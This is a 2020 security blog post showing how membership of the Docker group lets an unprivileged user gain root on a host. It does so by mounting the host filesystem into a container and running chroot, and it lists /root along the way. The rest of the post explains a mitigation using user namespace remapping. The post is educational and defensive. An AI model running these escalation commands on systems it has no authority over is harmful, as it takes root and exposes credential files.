+++
title = "Privilege escalation using Docker"
date = "2020-08-25"
author = "Aloïs Micard"
authorTwitter = "" #do not include @
cover = ""
tags = ["Docker", "Security", "Privilege Escalation"]
keywords = ["", ""]
description = "How to gain root access by using a Docker engine running with default configuration."
showFullContent = false
+++

This blog post is part of a series around [security](/tags/security) & [privilege escalation](/tags/privilege-escalation).

---

I have done a little security audit on a friend VPS last week, he was providing Docker runtime
to some people, with SSH access, and wanted to know if his setup was secure.

By default, docker only allow to run command as root user, in most case this is not desired since giving
root access equals giving full power over the host. A simple workaround is to add the user to the 'docker'
group so that the user will be able to dial with the docker socket. That's what my friend has done. But by default
this is **not secure at ALL**.

Let's see how to use the docker group to gain full root access on the host.

This method is really similar to the [lxc group privilege escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation),
and that's how I've come up with this one.

# Privilege escalation

The only thing I had on the VPS was an un-privileged user, like the
others users.

```sh
creekorful@docker01:~$ id
uid=1001(creekorful) gid=1001(creekorful) groups=1001(creekorful),998(docker)
```

Here we can see that we are in the docker group, so we can talk to the docker daemon.

To gain root access one the host, one can create a docker container and mount the host disk
inside it.

Let's try to display the files inside host /root:

```sh
creekorful@docker01:~$ docker run -it -v /:/mnt/root debian:stable-slim ls -altr /mnt/root/root
total 56
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 Mar 27 07:52 .ssh
drwx------  2 root root  4096 Mar 27 22:43 .docker
drwxr-xr-x  3 root root  4096 Mar 27 23:07 .local
drwx------  3 root root  4096 Jun  8 09:40 .config
drwxr-xr-x 18 root root  4096 Aug 23 20:14 ..
-rw-------  1 root root 14345 Aug 25 09:14 .viminfo
drwx------  6 root root  4096 Aug 25 09:14 .
-rw-r--r--  1 root root  5774 Aug 25 09:55 .bash_history
```

Since Docker has setuid bit set, we were able to mount the whole host disk
inside the /mnt/root partition (*-v /:/mnt/root*). And since we are root, we can list */root*.

Now let's try to mount again the host filesystem
and use [chroot](https://linux.die.net/man/1/chroot) to gain full privileges.

```sh
creekorful@docker01:~$ docker run -it -v /:/mnt/root debian:stable-slim chroot /mnt/root
# id
uid=0(root) gid=0(root) groups=0(root)
```

We now have full root access on the host.

# How to mitigate the exploit?

Fortunately solutions exist to prevent this exploit. I will cover the most straightforward one.

## Linux namespaces?

Linux has a [namespacing functionality](https://www.man7.org/linux/man-pages/man7/namespaces.7.html) use to
introduce the network, mount, user, ... isolation. Containerization (and therefore Docker) uses these to add security.

Basically each container will run into his own namespaces to isolate it from the host.

The process isolation is implemented using the [user namespace](https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html).
User namespace allow to have a different user inside a namespace than the parent one. We can for example run as root
inside a namespace while being un-privileged.

Let's try this quickly:

```sh
root@test-vm:~# id
uid=0(root) gid=0(root) groups=0(root)
root@test-vm:~# unshare -U /bin/sh # create a namespace and execute /bin/sh inside it
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ echo $$ # get current pid
29552
```

By running [unshare](https://man7.org/linux/man-pages/man1/unshare.1.html) I have spawn a /bin/sh process
detached from the user namespace (-U). We can see that I'm know running as nobody inside the namespace,
despite being root on the host.

Each unix process have a /proc/\<pid>/{u,g}id_map files.
These files are used to give a user/group ID mapping: we can say something like:

uid 0 in the current namespace is mapped to uid 1000 on the parent namespace. (0 1000 ...)

Let's try to give us an identity in our namespace.

```sh
root@test-vm:~#echo "1000 0 65536" > /proc/29552/uid_map
```

By issuing this command we will override the identity mapping of the namespace in the following way:
- uid in the namespace will start at 1000
- uid will be mapped in the parent namespace starting from 0
- the next 65536 uids will be mapped using this rule

So basically the first uid being assigned in the namespaced process will have uid 1000 and this will
correspond to uid 1000+0 = 1000 in the parent namespace.

Let's confirm that:

```sh
$ id
uid=1000(creekorful) gid=65534(nogroup) groups=65534(nogroup)
```

it works! we are now running as uid 1000 in the user namespace.

## Preventing from using root

So now that we know how the user namespace is working,
we'll see how to use that in our advantage. You just need to know that for Docker, 
each container will run in his own user namespace.

Let's inspect the user identity mapping of our container:

```sh
creekorful@docker01:~$ docker run -it -v /:/mnt/root debian:stable-slim chroot /mnt/root
# cat /proc/self/uid_map
         0          0 4294967295
```

This file tells us: uid 0 for current namespace is mapped to parent uid 0, and it's the same up to uid 4294967295.
So being root in the container = being root on the host.

What we will do to mitigate the exploit is to map container uid 0 to something non-root (!= 0) on the host (the parent namespace), 
fortunately this can be done easily by using /etc/sub{g,u}id [files](https://www.man7.org/linux/man-pages/man5/subuid.5.html).

```sh
creekorful@docker01:~$ cat /etc/sub{g,u}id
debian:100000:65536
creekorful:165536:65536
debian:100000:65536
creekorful:165536:65536
...
```

These files are used to determinate the allowed range of sub {user,group} ID allowed to use by the user.
The format is: *<user>:<sub{g,u}id>:<sub{g,u}id count>*

So what we will do is add an *dockremap* (special docker user) entry to these files, and limit the sub{g,u}id of this user.

I have asked my friend to perform the following:

Add the dockremap entry to the /etc/subuid file:

```
root@docker01:~# echo 'dockremap:100:65536' >> /etc/subuid
```

By doing this we are saying: root inside the container (0) will be mapped to uid (100) in the parent namespace (on the host).

Now we must ask docker to create the container using the *dockremap* user.
This can be done by modifying /etc/docker/daemon.json

```json
{
  "userns-remap": "default"
}
```

(Default means use dockremap user).

And finally, just restart the docker daemon to apply the changes.

```sh
root@docker01:~# systemctl restart docker
```

# Let's try again

```sh
creekorful@docker01:~$ docker run -it -v /:/mnt/root debian:stable-slim /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

As we can see we are still root inside the container. But what's for the outside?

```sh
# cat /proc/self/uid_map
         0        100      65536
```

the uid is now 100 instead of 0. We are no more root (our user id on the host is now 0+100=100).

Let's try to check the content of /etc/shadow to make sure it's working:

```sh
# cat /mnt/root/etc/shadow
cat: can't open '/mnt/root/etc/shadow': Permission denied
```

the exploit is now mitigated.

Happy hacking!
